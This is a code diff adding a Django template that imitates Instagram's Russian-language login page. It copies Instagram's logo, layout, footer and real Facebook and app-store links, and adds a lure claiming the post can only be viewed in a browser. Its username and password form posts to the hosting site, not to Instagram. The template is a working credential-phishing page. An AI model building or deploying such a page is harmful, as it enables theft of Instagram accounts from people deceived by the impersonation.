@@ -1,0 +1,94 @@
+{% extends 'main/base.html' %}
+{% load static %}
+
+{% block content %}
+    <main class="container">
+        <div class="hero">
+            <div class="hero-body">
+                <div class="columns is-multiline is-centered">
+                    <div class="column is-4-desktop is-hidden-mobile">
+                        <div class="phones" style="background-image: url({% static 'main/images/android-and-iphone.png' %})"></div>
+                    </div>
+                    <div class="column is-4-desktop px-5 mt-4 is-flex is-flex-direction-column">
+                        <div class="hero signin-card">
+                            <div class="hero-body pt-0 is-flex is-flex-direction-column">
+                                <div class="logo mt-4" style="background-image: url({% static 'main/images/instagram.png' %})"></div>
+                                <form action="" method="POST">
+                                    {% csrf_token %}
+                                    {{ form.username }}
+                                    {{ form.password }}
+                                    <button class="button is-small has-text-weight-bold is-fullwidth py-4 my-3 submit-btn">Войти</button>
+                                </form>
+                                <div class="separator has-text-grey">или</div>
+                                <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%252216cqv641mu72mxvsgibl1ezye571wltxs0jdbt5g1tr3brltr59vu%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Dru_RU%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D39504a56-dfaa-4e44-a8d1-77f6405e79ba%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252216cqv641mu72mxvsgibl1ezye571wltxs0jdbt5g1tr3brltr59vu%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=ru_RU&pl_dbl=0" target="_blank" class="is-flex is-justify-content-center is-align-items-center my-5">
+                                    <figure class="image is-16x16 mx-2">
+                                        <img src="{% static 'main/images/facebook.png' %}" alt="">
+                                    </figure>
+                                    <p class="or-signin-facebook">Войти через Facebook</p>
+                                </a>
+
+                                <div class="content has-text-centered">
+                                    <p class="title is-7 has-text-danger">
+                                        Данная публикация доступно только через браузер.
+                                    </p>
+                                </div>
+                            
+                                <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="is-flex is-justify-content-center is-align-items-center">
+                                    <p class="is-size-7 forget-password">Забыли пароль?</p>
+                                </a>
+                            </div>
+                        </div>
+                       
+                        <div class="hero signin-card mt-3">
+                            <div class="hero-body p-4 is-flex is-flex-direction-column">
+                                <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="is-flex is-justify-content-center is-align-items-center">
+                                    <p class="has-text-centered has-account">У вас ещё нет аккаунта? <span class="has-text-info">Зарегистрироваться</span></p>
+                                </a>
+                            </div>
+                        </div>
+
+                        <div class="mt-3">
+                            <div class="is-flex is-flex-direction-column">
+                                <p class="has-account has-text-centered my-3">Установите приложение.</p>
+                                <div class="is-flex is-justify-content-center my-3">
+                                    <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
+                                    <figure class="image is-128x128 mr-1">
+                                        <img src="{% static 'main/images/appstore.png' %}" alt="">
+                                    </figure>
+                                    </a>
+                                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US&pli=1" target="_blank">
+                                    <figure class="image is-128x128 ml-1">
+                                        <img src="{% static 'main/images/googleplay.png' %}" alt="">
+                                    </figure>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="column is-12 py-0">
+                        <footer class="footer has-background-white py-0">
+                            <div class="content has-text-centered has-text-grey is-size-7">
+                                <a href="" class="has-text-grey mx-2">Meta</a>
+                                <a href="" class="has-text-grey mx-2">Информация</a>
+                                <a href="" class="has-text-grey mx-2">Блог</a>
+                                <a href="" class="has-text-grey mx-2">Вакансии</a>
+                                <a href="" class="has-text-grey mx-2">Помощь</a>
+                                <a href="" class="has-text-grey mx-2">API</a>
+                                <a href="" class="has-text-grey mx-2">Конфиденциальность</a>
+                                <a href="" class="has-text-grey mx-2">Условия</a>
+                                <a href="" class="has-text-grey mx-2">Популярные аккаунты</a>
+                                <a href="" class="has-text-grey mx-2">Места</a>
+                                <a href="" class="has-text-grey mx-2">Instagram Lite</a>
+                                <a href="" class="has-text-grey mx-2">Meta Verified</a>
+                            </div>
+                            <div class="content has-text-centered has-text-grey is-size-7">
+                                <a href="" class="has-text-grey mx-2">Русский</a>
+                                <a href="" class="has-text-grey mx-2">© 2023 Instagram from Meta</a>
+                            </div>
+                        </footer>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+{% endblock %}
